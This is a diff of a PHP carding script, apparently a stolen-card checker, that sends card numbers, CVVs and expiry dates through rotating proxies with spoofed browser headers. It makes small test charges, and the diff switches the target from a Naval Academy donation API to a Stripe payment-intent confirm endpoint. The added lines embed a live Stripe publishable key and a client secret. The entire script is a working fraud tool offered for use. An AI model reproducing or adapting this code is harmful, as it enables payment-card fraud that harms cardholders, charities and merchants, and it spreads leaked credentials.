@@ -229,23 +229,23 @@ $ip = "Proxy Dead:[".$rotate."]";
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.usna.com/API/Gifts/');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/pi_3KbtTKD7E5KeLz7Y0bZXr63L/confirm');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.usna.com',
+'authority: api.stripe.com',
 'method: POST',
-'path: /API/Gifts/',
-'scheme: HTTP/1.1',
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-language: en-US,en;q=0.9',
-'content-type: application/json; charset=UTF-8',
-'origin: https://www.usna.com',
-'referer: https://www.usna.com/',
+'path: /v1/payment_intents/pi_3KbtTKD7E5KeLz7Y0bZXr63L/confirm',
+'scheme: https',
+'accept: application/json',
+'accept-language: en-US,en;q=0.9,bn;q=0.8',
+'content-type: application/x-www-form-urlencoded',
+'origin: https://js.stripe.com',
+'referer: https://js.stripe.com/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
-'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
+'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
 ));
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -256,10 +256,9 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"constituent":{"lookupId":null,"recordId":null,"constituentId":null,"firstName":"'.$firstname.'","middleInitial":null,"maidenName":null,"lastName":"'.$lastname.'","graduationName":null,"addressBlock":"'.$street.'","city":"'.$city.'","state":"'.$state.'","country":"00cb6cdb-f6cf-44e2-9c73-51ddf7965d8f","postalCode":"'.$postcode.'","phoneType":null,"phoneHome":"2024087524","phoneBusiness":null,"phoneCell":null,"email":"Inddfo@tablig.net","doNotEmail":false,"primaryEmailAddressId":"00000000-0000-0000-0000-000000000000","classYear":null,"constituencies":null,"primaryConstituency":null,"newAddress":false,"creditCard":{"webserver":null,"agentCode":null,"iatSpw":null,"cardNumber":"'.$cc.'","obscuredCardNumber":null,"type":"DSC","invoiceNumber":"","charge":0.5,"firstName":"","lastName":"'.$name.'+'.$last.'","address":"","city":"'.$city.'","state":"'.$state.'","zipCode":"'.$postcode.'","cvv2":"'.$cvv.'","expirationDate":"'.$mes.'/'.$ano.'","authCode":null,"testMode":false},"spouseConstituentId":"00000000-0000-0000-0000-000000000000"},"gifts":[{"Anonymous":false,"Appeal":null,"AppealId":null,"AuthCode":"","AutoPay":false,"CVV2":"","CampaignId":null,"CampaignLookupId":null,"CampaignName":null,"CardHolderName":"'.$name.'+'.$last.',"Company":null,"ConstitId":"00000000-0000-0000-0000-000000000000","CreditCardExpiration":"'.$mes.'/'.$ano.'","CreditCardNumber":"'.$cc.'","CreditCardType":"DSC","DesignationId":null,"DesignationLookupId":"69000000","FundId":null,"FundLookupId":"69000000","FundName":"Naval Academy Fund","FundType":"","GiftType":"one-time","InstallmentAmount":0,"IsPledge":null,"Mailing":null,"NumberOfInstallments":0,"PaidAmount":0.5,"PayPlan":null,"PaymentDate":null,"PaymentMethod":null,"PaymentReference":null,"PaymentType":null,"Processed":null,"Results":null,"RevenueId":null,"TotalAmount":0.5,"GiftInTribute":false,"TributeType":"in honor of","HonoreeFirstName":"","HonoreeLastName":"","HonoreeClassYear":"","HonoreeAdditionalInfo":"","EmployerMatch":false,"EmployersName":"","OtherFund":"","SourceCode":"","CustomEmail":""}],"token":"'.$token.'","clientipaddress":""}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&payment_method_data[billing_details][name]='.$name.'+'.$last.'&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&payment_method_data[muid]=c7a2b5b1-a81d-4ce4-b98a-2f64154faebd94ca6a&payment_method_data[sid]=e49124e2-8d6e-46c4-8475-c320ed969d2cb82323&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F211a0366e%3B+stripe-js-v3%2F211a0366e&payment_method_data[time_on_page]=94342&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=true&spc_eligible=true&key=pk_live_51I50nYD7E5KeLz7YoQinJtyPrpoFDfh1FJkobELxo1n2QqfvD2vak08BILK8iLStEzFKSC8RYlw4PnjayhQadOj900FgmYUdQj&client_secret=pi_3KbtTKD7E5KeLz7Y0bZXr63L_secret_YrjNKPusdz4cFj0VjqmiR1h60');
 
 $result = curl_exec($ch);
-$id = trim(strip_tags(getStr($result1,'"token": "','"'))); 
 $info = curl_getinfo($ch);
 $time = $info['total_time'];
 
